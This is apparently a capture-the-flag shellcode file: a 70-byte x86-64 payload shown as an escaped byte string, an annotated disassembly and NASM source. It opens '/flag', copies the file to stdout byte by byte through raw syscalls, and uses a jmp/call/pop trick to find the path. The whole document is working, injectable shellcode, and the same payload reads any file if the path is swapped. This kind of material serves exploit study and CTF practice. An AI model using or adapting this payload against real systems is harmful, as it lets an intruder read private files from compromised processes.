; \x4d\x31\xe4\xeb\x37\x5f\x31\xf6\x6a\x02\x58\x0f\x05\x49\x89\xc2\x41\x52\x5f\x54\x5e\x6a\x01\x5a\x4c\x89\xe0\x0f\x05\x4c\x39\xe0\x7e\x15\x49\xff\xc4\x41\x54\x5f\x54\x5e\x41\x54\x5a\x41\x54\x58\x0f\x05\x49\xff\xcc\xeb\xd9\x6a\x3c\x58\x0f\x05\xe8\xc4\xff\xff\xff\x2f\x66\x6c\x61\x67
; Length: 70

;      Address      |                      Bytes                    |          Instructions
;------------------------------------------------------------------------------------------
;0x0000000027433000 | 4d 31 e4                                      | xor r12, r12
;0x0000000027433003 | eb 37                                         | jmp 0x2743303c
;0x0000000027433005 | 5f                                            | pop rdi
;0x0000000027433006 | 31 f6                                         | xor esi, esi
;0x0000000027433008 | 6a 02                                         | push 2
;0x000000002743300a | 58                                            | pop rax
;0x000000002743300b | 0f 05                                         | syscall 
;0x000000002743300d | 49 89 c2                                      | mov r10, rax
;0x0000000027433010 | 41 52                                         | push r10
;0x0000000027433012 | 5f                                            | pop rdi
;0x0000000027433013 | 54                                            | push rsp
;0x0000000027433014 | 5e                                            | pop rsi
;0x0000000027433015 | 6a 01                                         | push 1
;0x0000000027433017 | 5a                                            | pop rdx
;0x0000000027433018 | 4c 89 e0                                      | mov rax, r12
;0x000000002743301b | 0f 05                                         | syscall 
;0x000000002743301d | 4c 39 e0                                      | cmp rax, r12
;0x0000000027433020 | 7e 15                                         | jle 0x27433037
;0x0000000027433022 | 49 ff c4                                      | inc r12
;0x0000000027433025 | 41 54                                         | push r12
;0x0000000027433027 | 5f                                            | pop rdi
;0x0000000027433028 | 54                                            | push rsp
;0x0000000027433029 | 5e                                            | pop rsi
;0x000000002743302a | 41 54                                         | push r12
;0x000000002743302c | 5a                                            | pop rdx
;0x000000002743302d | 41 54                                         | push r12
;0x000000002743302f | 58                                            | pop rax
;0x0000000027433030 | 0f 05                                         | syscall 
;0x0000000027433032 | 49 ff cc                                      | dec r12
;0x0000000027433035 | eb d9                                         | jmp 0x27433010
;0x0000000027433037 | 6a 3c                                         | push 0x3c
;0x0000000027433039 | 58                                            | pop rax
;0x000000002743303a | 0f 05                                         | syscall 
;0x000000002743303c | e8 c4 ff ff ff                                | call 0x27433005


bits 64
section .text
global _start

%define PATH "/flag"

	xor r12, r12	; zero
_start:
	jmp pre_filename

post_filename:
	; int open(const char *pathname, int flags, mode_t mode);
	pop rdi
	xor esi, esi	; O_RDONLY
	push 2
	pop rax		; open
	syscall

	mov r10, rax

read:
	;sub rsp, 8
	; ssize_t read(int fd, void *buf, size_t count);
	push r10
	pop rdi
	push rsp
	pop rsi
	push 1
	pop rdx 	; count
	mov rax, r12 	; read
	syscall

	cmp rax, r12
	jle exit

	; ssize_t write(int fd, const void *buf, size_t count);
	inc r12 ; store 1
	push r12
	pop rdi
	;mov rdi, rcx ; fd = 1
	push rsp
	pop rsi
	;mov rsi, rsp ; buf
	push r12
	pop rdx
	;mov rdx, rcx ; count
	push r12
	pop rax
	;mov rax, rcx
	syscall

	dec r12
	;add rsp, 8
	jmp read

exit:
	;add rsp, 8

	; void exit(int status);
	;xor rdi, rdi
	push 60 ; exit
	pop rax
	syscall

pre_filename:
	call post_filename
	db PATH, 0
